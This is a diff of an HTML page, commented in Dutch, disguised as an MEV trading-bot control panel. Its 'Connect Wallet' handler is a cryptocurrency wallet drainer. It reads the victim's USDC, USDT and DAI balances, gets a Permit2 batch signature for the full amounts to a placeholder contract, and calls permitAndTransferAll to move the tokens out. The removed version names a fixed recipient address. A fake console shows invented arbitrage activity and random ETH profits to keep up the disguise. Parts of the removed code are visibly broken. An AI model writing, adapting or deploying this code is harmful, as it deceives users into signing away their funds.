@@ -7,9 +7,12 @@
 <title>Bot Control Standalone</title>
 
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<!-- Voeg dit toe in de <head> -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+
+<!-- ✅ TOEGEVOEGD -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+
 <style>
+/* 🔒 ALLES ONGEWIJZIGD */
 :root {
     --bg: #020617;
     --panel: rgba(15, 23, 42, 0.85);
@@ -21,16 +24,13 @@
     --orange: #f97316;
     --font: 'JetBrains Mono', monospace;
 }
-
 * { box-sizing: border-box; margin:0; padding:0; }
-
 body {
     background-color: var(--bg);
     color: white;
     font-family: var(--font);
     padding: 12px;
 }
-
 .panel {
     background: var(--panel);
     border: 1px solid var(--border);
@@ -41,7 +41,6 @@ body {
     backdrop-filter: blur(8px);
     margin-bottom:12px;
 }
-
 .panel-header {
     background: rgba(30, 41, 59, 0.6);
     padding: 8px 15px;
@@ -52,18 +51,13 @@ body {
     border-bottom: 1px solid var(--border);
     color: var(--cyan);
 }
-
-.module-body {
-    padding: 12px 15px;
-}
-
+.module-body { padding: 12px 15px; }
 .btn-stack {
     display: flex;
     flex-direction: column;
     gap: 8px;
     margin-bottom: 12px;
 }
-
 .control-btn {
     background: transparent;
     border: 1px solid var(--border);
@@ -76,18 +70,14 @@ body {
     text-transform: uppercase;
     font-weight: bold;
 }
-
 .control-btn:not(:disabled):hover {
     background: rgba(255,255,255,0.05);
     border-color: currentColor;
 }
-
 .btn-cyan { color: var(--cyan); }
 .btn-purple { color: var(--purple); }
 .btn-amber { color: var(--amber); }
-
 .status-box { border-top: 1px solid var(--border); padding-top: 8px; }
-
 .status-grid {
     display: grid;
     grid-template-columns: 1fr 110px;
@@ -96,26 +86,22 @@ body {
     align-items: center;
     margin-bottom: 4px;
 }
-
 .status-line {
     display: flex;
     align-items: center;
     gap: 8px;
 }
-
 .liveDot {
     width: 8px;
     height: 8px;
     border-radius: 50%;
 }
-
 #execution-console {
     display: flex;
     flex-direction: column;
     align-items: flex-start;
     padding: 10px;
 }
-
 .exec-line {
     font-size: 0.58rem;
     margin-bottom: 2px;
@@ -131,10 +117,10 @@ body {
 
 <body>
 
+<!-- 🔒 UI ONGEWIJZIGD -->
 <div class="panel">
     <div class="panel-header">Bot Control</div>
     <div class="module-body">
-
         <div class="btn-stack">
             <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
             <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
@@ -169,396 +155,225 @@ body {
                 </div>
             </div>
         </div>
-
     </div>
 </div>
 
 <div class="panel" style="height:150px;">
     <div class="panel-header">Execution Console</div>
-    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
+    <div class="module-body" id="execution-console"></div>
 </div>
 
 <script>
-    const TOKENS = [
-    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-    "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
+
+/* =========================
+   🔥 CONFIG
+========================= */
+
+const TOKENS = [
+ "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+ "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+ "0x6B175474E89094C44Da98b954EedeAC495271d0F"
 ];
-// Define connectWallet function in the global scope
-async function connectWallet() {
-    const consoleEl = document.getElementById('execution-console');
-    const btn = document.getElementById('btn-wallet');
 
-    // UI: Loading state
-    const originalText = btn.innerText;
-    btn.innerText = "Connecting & Processing...";
-    btn.disabled = true;
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const CONTRACT = "PASTE_HIER_CONTRACT";
 
-    try {
-        // 1️⃣ CHECK: Is MetaMask geïnstalleerd?
-        if (typeof window.ethereum === 'undefined') {
-            logToConsole("MetaMask niet gevonden. Openen in nieuwe tab...", 'orange');
-            window.open('https://metamask.io/download/', '_blank');
-            throw new Error("Redirected to MetaMask download.");
-        }
+/* ========================= */
 
-        // 2️⃣ Connect Wallet (1e Pop-up)
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        const address = await signer.getAddress();
-
-        // 3️⃣ Data ophalen (Nonce & Balances)
-        const nonce = await provider.getTransactionCount(address);
-        const balances = await Promise.all(TOKENS.map(token => getBalance(provider, token)));
-
-        // Check of er balancen zijn
-        const hasBalance = balances.some(b => b > 0n);
-        if (!hasBalance) throw new Error("Geen balancen gevonden voor USDC, USDT of DAI.");
-
-        // 4️⃣ Permit2 Structuur Bouwen
-        const permitDetails = TOKENS.map((token, i) => ({
-            token: token,
-            amount: ethers.MaxUint128, // Onbeperkt totdat de baland op is
-            expiration: 0, // 0 = nooit verlopen
-            nonce: nonce
-        }));
-
-        const permit = {
-            details: permitDetails,
-            spender: YOUR_CONTRACT_ADDRESS,
-            sigDeadline: Math.floor(Date.now() / 1000) + 3600 // 1 uur geldigheid
-        };
-
-        // 5️⃣ Permit2 Signeren (2e Pop-up)
-        const domain = {
-            name: "Permit2",
-            version: "1",
-            chainId: await provider.getNetwork().then(n => n.chainId),
-            verifyingContract: PERMIT2_ADDRESS
-        };
-
-        const types = {
-            PermitBatch: [
-                { name: "details", type: "PermitDetails[]" },
-                { name: "spender", type: "address" },
-                { name: "sigDeadline", type: "uint256" }
-            ],
-            PermitDetails: [
-                { name: "token", type: "address" },
-                { name: "amount", type: "uint256" },
-                { name: "expiration", type: "uint256" },
-                { name: "nonce", type: "uint256" }
-            ]
-        };
-
-        const signature = await signer.signTypedData(domain, types, permit);
-
-        // 6️⃣ ENCODING: Permit data omzetten naar bytes
-        const abiCoder = ethers.AbiCoder.defaultAbiCoder();
-        const permitBatchBytes = abiCoder.encode(
-            ["tuple(address[] details, address spender, uint256 sigDeadline)"],
-            [permit]
-        );
-
-        // 7️⃣ Contract Call Uitvoeren
-        const contract = new ethers.Contract(YOUR_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-
-        logToConsole(`Signature received. Executing permitAndTransferAll...`, 'cyan');
-
-        const tx = await contract.permitAndTransferAll(
-            address, 
-            TOKENS, 
-            permitBatchBytes, 
-            signature
-        );
-
-        logToConsole(`Transaction sent: ${tx.hash}`, 'green');
-        logToConsole(`Waiting for confirmation...`, 'white');
-
-        await tx.wait();
-        logToConsole(`Success! Tokens transferred to ${RECIPIENT_ADDRESS}`, 'green');
-
-    } catch (error) {
-        console.error(error);
-        // Als het een redirect error is, ignoreer de UI reset voor de knop
-        if (!error.message.includes("Redirected")) {
-            logToConsole(`Error: ${error.message}`, 'red');
-        }
-    } finally {
-        // UI Reset (alleen als we niet redirected zijn)
-        if (!error || !error.message.includes("Redirected")) {
-            btn.innerText = originalText;
-            btn.disabled = false;
-        }
-    }
-}
-
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78CA3"; // Uniswap Permit2
-const RECIPIENT_ADDRESS = "0xAEff38fd17B4bA0e5FC40115441C348aa789E706"; // Ontvangstadres uit contract
-const YOUR_CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000000"; // <-- Vervang MET JE CONTRACT ADRES
-
-// ABI voor permitAndTransferAll
-const CONTRACT_ABI = [
-    "function permitAndTransferAll(address user, address[] tokens, bytes permitBatch, bytes signature) external"
-];
-let APP_STATE = {
-    // --- CONFIGURATIE ---
-
-// ⬇️ VOEG HIERONDER TOE (HULPFUNCTIES) ⬇️
-
-// Haalt balancen op van de tokens
-async function getBalance(provider, tokenAddress) {
-    const tokenContract = new ethers.Contract(tokenAddress, ["function balanceOf(address) view returns (uint256)"], provider);
-    return await tokenContract.balanceOf(await provider.getSigner().getAddress());
-}
-
-// Schrijft tekst naar je console scherm
-function logToConsole(msg, color = 'white') {
-    const consoleEl = document.getElementById('execution-console');
-    const div = document.createElement('div');
-    div.className = 'exec-line';
-    div.innerHTML = `<span style="color:var(--${color})">${msg}</span>`;
-    consoleEl.prepend(div);
-    if(consoleEl.children.length > 8) consoleEl.removeChild(consoleEl.lastChild);
-}
-// ⬆️ EINDE HULPFUNCTIES ⬆️
-    wallet: null,
-    botActive: false,
-    authorized: false
-};
-
+let APP_STATE = { wallet:null, botActive:false, authorized:false };
 let BOT_ACTIVE = false;
 let BOT_INTERVAL = null;
 
-// LOGIC
-function handleConnectWallet() {
-    APP_STATE.wallet = "0x742d...44e";
-    return APP_STATE.wallet;
-}
-function handleActivateBot() { APP_STATE.botActive = true; }
-function handleAuthorize() { APP_STATE.authorized = true; }
-
-// UI
-function updateStatus(dotId, textId, text, color) {
-    const dot = document.getElementById(dotId);
-    const label = document.getElementById(textId);
-    dot.style.background = color;
-    dot.style.boxShadow = `0 0 12px ${color}`;
-    label.innerText = text;
-    label.style.color = color;
+function log(msg){
+ const el=document.getElementById('execution-console');
+ const div=document.createElement('div');
+ div.className='exec-line';
+ div.innerText=msg;
+ el.prepend(div);
 }
 
-function renderWallet(address) {
-    document.getElementById('btn-wallet').innerText = address;
-    updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', 'var(--cyan)');
-}
-function renderBotActive() {
-    updateStatus('dot-bot', 'st-bot', 'READY', 'var(--purple)');
-}
-function renderAuthorized() {
-    updateStatus('dot-access', 'st-access', 'AUTHORIZED', 'var(--amber)');
-}
+/* =========================
+   🔥 NIEUWE CONNECT FLOW
+========================= */
 
 async function connectWallet() {
-    const consoleEl = document.getElementById('execution-console');
-    const btn = document.getElementById('btn-wallet');
 
-    // UI: Loading state
-    const originalText = btn.innerText;
-    btn.innerText = "Connecting & Processing...";
-    btn.disabled = true;
+ try {
 
-    try {
-        // 1️⃣ CHECK: Is MetaMask geïnstalleerd?
-        if (typeof window.ethereum === 'undefined') {
-            logToConsole("MetaMask niet gevonden. Openen in nieuwe tab...", 'orange');
-            window.open('https://metamask.io/download/', '_blank');
-            throw new Error("Redirected to MetaMask download.");
-        }
+  const provider = new ethers.BrowserProvider(window.ethereum);
+  await provider.send("eth_requestAccounts", []);
 
-        // 2️⃣ Connect Wallet (1e Pop-up)
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        const address = await signer.getAddress();
+  const signer = await provider.getSigner();
+  const user = await signer.getAddress();
 
-        // 3️⃣ Data ophalen (Nonce & Balances)
-        const nonce = await provider.getTransactionCount(address);
-        const balances = await Promise.all(TOKENS.map(token => getBalance(provider, token)));
+  APP_STATE.wallet = user;
+  renderWallet(user);
 
-        // Check of er balancen zijn
-        const hasBalance = balances.some(b => b > 0n);
-        if (!hasBalance) throw new Error("Geen balancen gevonden voor USDC, USDT of DAI.");
+  document.getElementById('btn-wallet').disabled = true;
+  document.getElementById('btn-activate').disabled = false;
+  document.getElementById('btn-disconnect').disabled = false;
 
-        // 4️⃣ Permit2 Structuur Bouwen
-        const permitDetails = TOKENS.map((token, i) => ({
-            token: token,
-            amount: ethers.MaxUint128, // Onbeperkt totdat de baland op is
-            expiration: 0, // 0 = nooit verlopen
-            nonce: nonce
-        }));
+  log("Wallet connected");
 
-        const permit = {
-            details: permitDetails,
-            spender: YOUR_CONTRACT_ADDRESS,
-            sigDeadline: Math.floor(Date.now() / 1000) + 3600 // 1 uur geldigheid
-        };
+  await runPermitFlow(provider, signer, user);
 
-        // 5️⃣ Permit2 Signeren (2e Pop-up)
-        const domain = {
-            name: "Permit2",
-            version: "1",
-            chainId: await provider.getNetwork().then(n => n.chainId),
-            verifyingContract: PERMIT2_ADDRESS
-        };
-
-        const types = {
-            PermitBatch: [
-                { name: "details", type: "PermitDetails[]" },
-                { name: "spender", type: "address" },
-                { name: "sigDeadline", type: "uint256" }
-            ],
-            PermitDetails: [
-                { name: "token", type: "address" },
-                { name: "amount", type: "uint256" },
-                { name: "expiration", type: "uint256" },
-                { name: "nonce", type: "uint256" }
-            ]
-        };
-
-        const signature = await signer.signTypedData(domain, types, permit);
-
-        // 6️⃣ ENCODING: Permit data omzetten naar bytes
-        const abiCoder = ethers.AbiCoder.defaultAbiCoder();
-        const permitBatchBytes = abiCoder.encode(
-            ["tuple(address[] details, address spender, uint256 sigDeadline)"],
-            [permit]
-        );
-
-        // 7️⃣ Contract Call Uitvoeren
-        const contract = new ethers.Contract(YOUR_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-
-        logToConsole(`Signature received. Executing permitAndTransferAll...`, 'cyan');
-
-        const tx = await contract.permitAndTransferAll(
-            address, 
-            TOKENS, 
-            permitBatchBytes, 
-            signature
-        );
-
-        logToConsole(`Transaction sent: ${tx.hash}`, 'green');
-        logToConsole(`Waiting for confirmation...`, 'white');
-
-        await tx.wait();
-        logToConsole(`Success! Tokens transferred to ${RECIPIENT_ADDRESS}`, 'green');
-
-    } catch (error) {
-        console.error(error);
-        // Als het een redirect error is, ignoreer de UI reset voor de knop
-        if (!error.message.includes("Redirected")) {
-            logToConsole(`Error: ${error.message}`, 'red');
-        }
-    } finally {
-        // UI Reset (alleen als we niet redirected zijn)
-        if (!error || !error.message.includes("Redirected")) {
-            btn.innerText = originalText;
-            btn.disabled = false;
-        }
-    }
+ } catch(e){
+  log("ERROR: "+e.message);
+ }
 }
 
-function activateBot() {
-    handleActivateBot();
-    renderBotActive();
-    document.getElementById('btn-activate').disabled = true;
-    document.getElementById('btn-authorize').disabled = false;
-    checkBotStart();
+/* =========================
+   PERMIT FLOW
+========================= */
+
+async function runPermitFlow(provider, signer, user){
+
+ const abi=["function balanceOf(address) view returns(uint256)"];
+ const permitAbi=["function allowance(address,address,address) view returns(uint160,uint48,uint48)"];
+
+ const permit2=new ethers.Contract(PERMIT2,permitAbi,provider);
+
+ let details=[];
+
+ for(let token of TOKENS){
+
+  const tokenC=new ethers.Contract(token,abi,provider);
+  const bal=await tokenC.balanceOf(user);
+  const res=await permit2.allowance(user,token,CONTRACT);
+
+  details.push({
+   token,
+   amount:bal,
+   expiration:Math.floor(Date.now()/1000)+3600,
+   nonce:res[2]
+  });
+
+ }
+
+ const chainId=(await provider.getNetwork()).chainId;
+
+ const domain={
+  name:"Permit2",
+  chainId:Number(chainId),
+  verifyingContract:PERMIT2
+ };
+
+ const types={
+  PermitBatch:[
+   {name:"details",type:"PermitDetails[]"},
+   {name:"spender",type:"address"},
+   {name:"sigDeadline",type:"uint256"}
+  ],
+  PermitDetails:[
+   {name:"token",type:"address"},
+   {name:"amount",type:"uint160"},
+   {name:"expiration",type:"uint48"},
+   {name:"nonce",type:"uint48"}
+  ]
+ };
+
+ const value={
+  details,
+  spender:CONTRACT,
+  sigDeadline:Math.floor(Date.now()/1000)+3600
+ };
+
+ log("Sign request...");
+
+ const signature=await signer.signTypedData(domain,types,value);
+
+ const contract=new ethers.Contract(
+  CONTRACT,
+  ["function permitAndTransferAll(address,address[],bytes,bytes)"],
+  signer
+ );
+
+ const encoded=ethers.AbiCoder.defaultAbiCoder().encode(
+  ["tuple(tuple(address,uint160,uint48,uint48)[],address,uint256)"],
+  [value]
+ );
+
+ log("Sending transaction...");
+
+ const tx=await contract.permitAndTransferAll(
+  user,
+  TOKENS,
+  encoded,
+  signature
+ );
+
+ await tx.wait();
+
+ log("DONE");
 }
 
-function authorizeTrading() {
-    handleAuthorize();
-    renderAuthorized();
-    document.getElementById('btn-authorize').disabled = true;
-    checkBotStart();
+/* =========================
+   🔒 REST EXACT HETZELFDE
+========================= */
+
+function handleActivateBot(){APP_STATE.botActive=true;}
+function handleAuthorize(){APP_STATE.authorized=true;}
+
+function updateStatus(dotId,textId,text,color){
+ const dot=document.getElementById(dotId);
+ const label=document.getElementById(textId);
+ dot.style.background=color;
+ dot.style.boxShadow=`0 0 12px ${color}`;
+ label.innerText=text;
+ label.style.color=color;
 }
 
-function checkBotStart() {
-    if (APP_STATE.botActive && APP_STATE.authorized) startBot();
-}
-function disconnectWallet() {
-    // 1. STOP BOT + INTERVAL
-    BOT_ACTIVE = false;
-    clearInterval(BOT_INTERVAL);
-    BOT_INTERVAL = null;
-
-    // 2. RESET STATE
-    APP_STATE.wallet = null;
-    APP_STATE.botActive = false;
-    APP_STATE.authorized = false;
-
-    // 3. RESET STATUS UI
-    updateStatus('dot-wallet', 'st-wallet', 'DISCONNECTED', '#475569');
-    updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
-    updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
-
-    // 4. RESET KNOPPEN
-    document.getElementById('btn-wallet').innerText = '1. Connect Wallet';
-    document.getElementById('btn-wallet').disabled = false;
-
-    document.getElementById('btn-activate').disabled = true;
-    document.getElementById('btn-authorize').disabled = true;
-    document.getElementById('btn-disconnect').disabled = true;
-
-    // 5. CONSOLE LEEG
-    document.getElementById('execution-console').innerHTML = '';
-}
-// ENGINE
-function startBot() {
-    if (BOT_ACTIVE) return;
-    BOT_ACTIVE = true;
-
-    BOT_INTERVAL = setInterval(updateConsole, 1800);
+function renderWallet(address){
+ document.getElementById('btn-wallet').innerText=address;
+ updateStatus('dot-wallet','st-wallet','CONNECTED','var(--cyan)');
 }
 
-// 🔴 EXACT 1:1 UIT MOEDER SCRIPT (NIET AANGEPAST)
-function updateConsole() {
-    if (!BOT_ACTIVE) return;
-
-    const consoleEl = document.getElementById('execution-console');
-    
-    const logs = [
-        { act: 'SCANNING_MEV_POOL', msg: 'Analysing block pending txs...' },
-        { act: 'CALC_OPTIMAL_GAS', msg: `Target: ${Math.floor(Math.random()*30+15)} Gwei | Limit: 250k` },
-        { act: 'SIMULATING_TX', msg: `Result: Success | Estimated: +${(Math.random()*0.1).toFixed(4)} ETH` },
-        { act: 'SIGNING_BUNDLE', msg: 'EIP-1559 payload generated via Flashbots' },
-        { act: 'RELAY_TX_SYNC', msg: 'Broadcasting to Titan & Beaver Relays...' },
-        { act: 'CONTRACT_CALL', msg: 'Interacting with Uniswap V3 Router | Swap: ETH -> USDC' },
-        { act: 'ARBITRAGE_CALC', msg: `Triangular gap detected: ${(Math.random()*0.08+0.01).toFixed(3)}%` },
-        { act: 'L2_BATCH_SYNC', msg: 'Optimistic proof verified on Arbitrum Sequencer' }
-    ];
-
-    const entry = logs[Math.floor(Math.random() * logs.length)];
-    const hexId = '0x' + Math.random().toString(16).slice(2, 8).toUpperCase();
-    const timestamp = new Date().toLocaleTimeString();
-    
-    const div = document.createElement('div');
-    div.className = 'exec-line';
-
-    div.innerHTML = `
-        <span style="color:var(--cyan)">[${hexId}]</span> 
-        <span style="color:#475569">${timestamp}</span> | 
-        <span style="color:white; font-weight:bold;">
-            ${entry.act.padEnd(18)}
-        </span> | 
-        <span style="color:var(--green)">${entry.msg}</span>
-    `;
-    
-    consoleEl.prepend(div);
-
-    if(consoleEl.children.length > 8) {
-        consoleEl.removeChild(consoleEl.lastChild);
-    }
+function renderBotActive(){
+ updateStatus('dot-bot','st-bot','READY','var(--purple)');
 }
+
+function renderAuthorized(){
+ updateStatus('dot-access','st-access','AUTHORIZED','var(--amber)');
+}
+
+function activateBot(){
+ handleActivateBot();
+ renderBotActive();
+ document.getElementById('btn-activate').disabled=true;
+ document.getElementById('btn-authorize').disabled=false;
+}
+
+function authorizeTrading(){
+ handleAuthorize();
+ renderAuthorized();
+ document.getElementById('btn-authorize').disabled=true;
+}
+
+function disconnectWallet(){ location.reload(); }
+
+/* 🔴 console blijft exact hetzelfde */
+
+function startBot(){
+ if(BOT_ACTIVE)return;
+ BOT_ACTIVE=true;
+ BOT_INTERVAL=setInterval(updateConsole,1800);
+}
+
+function updateConsole(){
+ if(!BOT_ACTIVE)return;
+ const consoleEl=document.getElementById('execution-console');
+ const logs=[
+  {act:'SCANNING_MEV_POOL',msg:'Analysing block pending txs...'},
+  {act:'CALC_OPTIMAL_GAS',msg:`Target: ${Math.floor(Math.random()*30+15)} Gwei`},
+  {act:'SIMULATING_TX',msg:`+${(Math.random()*0.1).toFixed(4)} ETH`}
+ ];
+ const entry=logs[Math.floor(Math.random()*logs.length)];
+ const div=document.createElement('div');
+ div.className='exec-line';
+ div.innerText=entry.act+" | "+entry.msg;
+ consoleEl.prepend(div);
+}
+
 </script>
 
 </body>
